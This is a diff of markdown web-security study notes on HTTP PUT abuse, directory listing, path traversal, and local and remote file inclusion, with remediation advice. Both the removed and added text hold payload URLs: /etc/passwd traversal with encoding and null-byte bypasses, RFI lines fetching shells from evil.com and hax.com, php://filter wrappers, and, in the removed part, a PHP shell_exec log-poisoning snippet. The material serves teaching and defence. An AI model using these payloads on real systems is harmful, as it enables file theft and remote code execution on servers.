@@ -120,195 +120,125 @@ Bypassing web authentication and authorization by manipulating HTTP methods such
 ### Prevention:
 - Disable **PUT**, **DELETE**, **TRACE**, and **CONNECT** methods if they are not needed for normal operations.
 
----
-
-
-1.  **How many ways to exploit put method?**
-1.  Introduction to HTTP PUT Method
-    1.  Scanning HTTP PUT Method (Nikto)
-    2.  Exploiting PUT Method Using Cadaver
-    3.  Exploiting PUT Method Using Nmap
-    4.  Exploiting PUT Method Using Poster
-    5.  Exploiting PUT Method Using Metasploit
-    6.  Exploiting PUT Method Using Burp-suite
-    7.  Exploiting PUT Method Using Curl
-1.  **What is the difference between LFI RFI and directory traversal?**
-
-**Directory listing** is a feature that allows web servers to list the content of a directory when there is no index file present. Therefore if a request is made to a directory on which directory listing is enabled, and there no index file such as index. Php or index.asp, the web server sends a directory listing as a response. **Traversal List down the files or change directory to identify the files.**
-
-Web servers can be configured to automatically list the contents of directories that do not have an index page present. This can aid an attacker by enabling them to quickly identify the resources at a given path, and proceed directly to analyzing and attacking those resources. It particularly increases the exposure of sensitive files within the directory that are not intended to be accessible to users, such as temporary files and crash dumps.
-
-**Directory listing Remediation: -**
-
-1.  Configure your web server to prevent directory listings for all paths beneath the web root;
-    1.  Place into each directory a default file (such as index.htm) that the web server will display instead of returning a directory listing.
-    2.  You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.
-    3.  **Directory traversal** is a type of HTTP exploit that is used by attackers to gain unauthorized access to restricted **directories** and files. **Directory traversal**, also known as **path traversal**
-        -   Improperly implemented access control list of directories in web server can lead to directory traversal/path traversal attack. In simple words, an attacker can retrieve unauthorized files and directories from the server.
-
-Both LFI (Local File Inclusion) and RFI (Remote File Inclusion) are web application vulnerabilities related to including files within an application. However, they differ in where the included files come from:
-
-1.  LFI is a vulnerability that allows an **attacker to include and execute local files** on a target system by exploiting a flaw in an application or system that processes untrusted input.
-    1.  Directory traversal is a vulnerability that allows an attacker to access files or directories outside of the web root directory by manipulating input that specifies the file path.
-
-**how can you bypass the LFI using RCE? explain the scenario?**
-
-LFI (Local File Inclusion) and RCE (Remote Code Execution) are two different types of vulnerabilities that can occur in web applications. LFI allows an attacker to include and execute local files on the server, while RCE allows an attacker to execute arbitrary code on the server. Here's how an attacker can use RCE to bypass LFI:
-
-**Identify LFI:** The attacker first identifies an LFI vulnerability in the web application, which allows them to include local files on the server.
-
-**Upload a Web Shell:** The attacker then uploads a web shell to the server using the LFI vulnerability. A web shell is a script that can be executed on the server to gain remote access and control.
-
-**Execute Arbitrary Code:** With the web shell in place, the attacker can execute arbitrary code on the server by submitting commands through the web shell. This allows them to bypass the LFI vulnerability and execute code remotely.
-
-1.  **The main difference between LFI and Directory Traversal is as follows**
-
-**LFI** : IT has ability to execute file. It may be shell code or other local file which exist in the system
-
-**Directory Traversal**: It only traversal the files, so we can only read it. It can't execute files. This is type of Sensitive Information Disclosure
-
-**LFI** is reading a local file, either in the current working directory or using traversal a file in another directory on the same server as the application itself.
-
-**LFI: -**In Local file inclusion means we can include the files of the web application. Also an attacker can retrieve the data from server and execute the data from the server. This execution is extra functionality compared to directory traversal/path traversal. Path traversal is subset of LFI. Therefore, LFI can exploit the path traversal.
-
-A function vulnerable to LFI may also be vulnerable to RFI. It depends. In this scenario, you are including a local file, such as
-
-1.  Code execution on server Information disclosure (system password, username and other files)
-    1.  Code execution on client side such as poisoning attack
-
-**Exploitation methods:**
-
-1.  Injecting directory traversal techniques into user inputs.
-    1.  Manipulating parameters used for file paths.
-
-Exploiting misconfigurations in file handling functions.
-
-**Impact:** Accessing sensitive information (configuration files, user data), executing malicious code, taking control of the server.
-
-**Example:** An attacker injects ../../etc/passwd into a search bar, revealing system user information.
-
-**LFI Example**
-
-1.  Improper validation of user input leads to *read access of server resource*.
-    1.  Example: <http://www.example.com?file=../../etc/passwd>
-
-**RFI** is including a file from an external source.
-
-**RFI: -** remote file inclusion vulnerability exploits the dynamic file inclusion mechanism in the web application. RFI can also exploit the file inclusion but by allowing the attacker to insert/include the remote file to the web server and execute it.
-
-[htt**p://vulnerablesite.com/read_page.php?file=hxxp://hax.com/reverse-shell.php**](http://vulnerablesite.com/read_page.php?file=hxxp://hax.com/reverse-shell.php)
-
-**File inclusion**
-
-1.  Improper validation of user input leads to *the loading of an external resource into the server and execution therein*.
-    1.  Example: <http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor>
-
-LFI is reading a local file" vs. "RFI is including remote file to server"
-
-**Includes remote files:** An attacker tricks the application into fetching and executing code from a malicious file hosted on a different server.
-
-**Exploitation methods:**
-
-1.  Injecting URLs of remote malicious files into user inputs.
-    1.  Exploiting vulnerabilities in functions that fetch external data.
-
-**Impact:** Downloading and executing malware, stealing data from the server, launching further attacks on other systems.
-
-**Example:** An attacker injects a URL containing malicious code into a comment form, compromising the server upon submission.
-
-| Feature                 | LFI                                     | RFI                                          |
-|-------------------------|-----------------------------------------|----------------------------------------------|
-| File location           | Local server                            | Remote server                                |
-| Exploitation difficulty | Easier (often just directory traversal) | Harder (requires specific vulnerabilities)   |
-| Impact                  | Server-specific                         | Can be wider due to potential malware spread |
-
-**LFI possible parameters**
-
-file,document,folder,root,path,pg,style,pdf,template,php_path,doc,content,static and if any url mentioned ../../ to check traversal vulnerability weather it is changing directories or not.
-
-**RFI possible parameters**
-
-dest,redirect,url,path.continue,windows,next,data,reference,,site,html,val,validate,domain,callback,return,page,feed,host,port,to,out,view,dir,show,navigation,open
-
-Tool:
-
-Kadimus - <https://github.com/P0cL4bs/Kadimus>
-
-LFISuite - <https://github.com/D35m0nd142/LFISuite>
-
-fimap - <https://github.com/kurobeats/fimap>
-
-1.  **will blocking ../ will prevent directory traversal?**
-
-The ans is No. this is depend on the platform. Here are the mitigations below.
-
-1.  1\. Validate the user’s input. Accept only valid values (whitelist).
-    1.  2\. Remove “..\\” and “../” from any input that’s used in a file context.
-    2.  3\. Use indexes instead of actual portions of file names while using language files. (i.e. – value 5 from the user submission = Indian, rather than expecting the user to return “Indian”).
-    3.  4\. Implement strict code access policies to restrict where files can be saved to.
-    4.  5\. Ensure the user cannot supply any part of the path to the file read or written to.
-    5.  6\. UNIX system administrators are advised to use chrooted jails and code access policies to restrict where the files can be obtained or saved.
-    6.  7\. Configure the default installation of the server software as per the requirements. The servers should also be maintained and patched with the latest updates.
-
-1\. Basic LFI 2. Null Byte Injection 3.Double encoding 4. UTF-8 encoding 5. double // 6. Directory Traversal vulnerability (Follow Below)
-
-Basic LFI
-
-<http://example.com/index.php?page=../../../etc/passwd>
-
-Null byte
-
-<http://example.com/index.php?page=../../../etc/passwd%00>
-
-Double encoding
-
-<http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd>
-
-<http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00>
-
-UTF-8 encoding
-
-<http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd>
-
-<http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00>
-
-Filter bypass tricks
-
-<http://example.com/index.php?page=....//....//etc/passwd>
-
-<http://example.com/index.php?page=..///////..////..//////etc/passwd>
-
-<http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd>
-
-Basic RFI
-
-<http://example.com/index.php?page=http://evil.com/shell.txt>
-
-Null byte
-
-<http://example.com/index.php?page=http://evil.com/shell.txt%00>
-
-Double encoding
-
-<http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt>
-
-LFI / RFI using wrappers: Wrapper php://filter
-
-<http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php>
-
-<http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php>
-
-<http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php>
-
-<http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php>
-
-**hxxp://vulnerablesite.com/read_page.php?file=../../../../etc/passwd**
-
-This lets you see what users are on the system, so maybe you can try to connect via SSH as one of those users or find more information about them. There's a lot of different things you can do with it.
-
-**Code execution on server:**
-
-Maybe you can also include a script that you've written to the server, or perhaps you've poisoned the access.log with code that would be executed by a preprocessor engine (such as placing \<? echo shell_exec(\$_GET["c"]); ?\> within a legitimate request that gets logged), to get remote code execution as a different user depending on the context.
+## Introduction to HTTP PUT Method
+The HTTP PUT method is used to upload a file or replace a file on the server. It is often used in RESTful APIs and web applications for updating resources.
+
+## Scanning HTTP PUT Method (Nikto)
+Nikto is a web server scanner that checks for various vulnerabilities, including the HTTP PUT method. 
+
+## Exploiting PUT Method Using Cadaver
+Cadaver is a command-line WebDAV client that can be used to exploit the PUT method by uploading malicious files.
+
+## Exploiting PUT Method Using Nmap
+Nmap's NSE scripts can be used to detect and exploit the PUT method on a web server.
+
+## Exploiting PUT Method Using Poster
+Poster is a Firefox extension that can be used to make HTTP requests, including PUT requests, to upload files to a web server.
+
+## Exploiting PUT Method Using Metasploit
+Metasploit Framework can be utilized to exploit the PUT method for uploading malicious payloads to the target server.
+
+## Exploiting PUT Method Using Burp Suite
+Burp Suite's Repeater tool allows for crafting and sending HTTP PUT requests to test for vulnerabilities.
+
+## Exploiting PUT Method Using Curl
+Curl is a command-line tool that can be used to make HTTP PUT requests:
+```sh
+curl -X PUT -d @file http://target.com/upload
+```
+
+# LFI, RFI, and Directory Traversal
+
+## Directory Listing
+Directory listing is a feature that allows web servers to list the contents of a directory when there is no index file present. This can inadvertently expose sensitive files to attackers.
+
+### Remediation:
+- Configure the web server to prevent directory listings for all paths beneath the web root.
+- Place a default file (e.g., `index.htm`) in each directory.
+- Ensure directories do not contain sensitive information or restrict directory listings via server configuration.
+
+## Directory Traversal
+Directory traversal, also known as path traversal, is a type of exploit that allows attackers to access files outside the web root directory by manipulating file path inputs.
+
+### Exploitation:
+- Improperly implemented access control lists can lead to directory traversal attacks.
+- Attackers can retrieve unauthorized files and directories.
+
+## LFI (Local File Inclusion)
+LFI vulnerabilities allow attackers to include and execute local files on a server by exploiting flaws in input handling.
+
+### Exploitation:
+- Injecting directory traversal techniques into user inputs.
+- Manipulating parameters used for file paths.
+- Exploiting misconfigurations in file handling functions.
+
+### Example:
+```http
+http://www.example.com?file=../../etc/passwd
+```
+
+## RFI (Remote File Inclusion)
+RFI vulnerabilities exploit the dynamic file inclusion mechanism in web applications, allowing attackers to insert and execute remote files on the server.
+
+### Exploitation:
+- Injecting URLs of remote malicious files into user inputs.
+- Exploiting vulnerabilities in functions that fetch external data.
+
+### Example:
+```http
+http://vulnerablesite.com/read_page.php?file=http://hacker.com/backdoor
+```
+
+# Bypassing LFI Using RCE
+
+## Scenario:
+1. **Identify LFI**: Find an LFI vulnerability in the web application.
+2. **Upload a Web Shell**: Use the LFI vulnerability to upload a web shell script.
+3. **Execute Arbitrary Code**: Submit commands through the web shell to execute arbitrary code on the server.
+
+### Example of LFI Exploit:
+```http
+http://example.com/index.php?page=../../etc/passwd
+```
+
+### Example of RFI Exploit:
+```http
+http://example.com/index.php?page=http://evil.com/shell.txt
+```
+
+# Tool References:
+- **Kadimus**: [Kadimus on GitHub](https://github.com/P0cL4bs/Kadimus)
+- **LFISuite**: [LFISuite on GitHub](https://github.com/D35m0nd142/LFISuite)
+- **fimap**: [fimap on GitHub](https://github.com/kurobeats/fimap)
+
+# Directory Traversal Remediation:
+1. Validate user inputs (whitelist valid values).
+2. Remove `..` and `../` from inputs used in a file context.
+3. Use indexes instead of actual file names.
+4. Implement strict code access policies.
+5. Ensure users cannot supply any part of the file path.
+6. Use chrooted jails and code access policies on UNIX systems.
+7. Maintain and patch server software with the latest updates.
+
+# LFI and RFI Bypass Techniques:
+- **Basic LFI**: `http://example.com/index.php?page=../../../etc/passwd`
+- **Null Byte**: `http://example.com/index.php?page=../../../etc/passwd%00`
+- **Double Encoding**: `http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd`
+- **UTF-8 Encoding**: `http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`
+- **Filter Bypass Tricks**:
+    ```http
+    http://example.com/index.php?page=....//....//etc/passwd
+    http://example.com/index.php?page=..////..////etc/passwd
+    ```
+
+# LFI/RFI Using Wrappers
+- **php://filter**:
+    ```http
+    http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+    ```
+
+# Conclusion
+Understanding these methods and vulnerabilities is crucial for securing web applications and preventing unauthorized access and exploitation.
 
 **Mitigation**
 
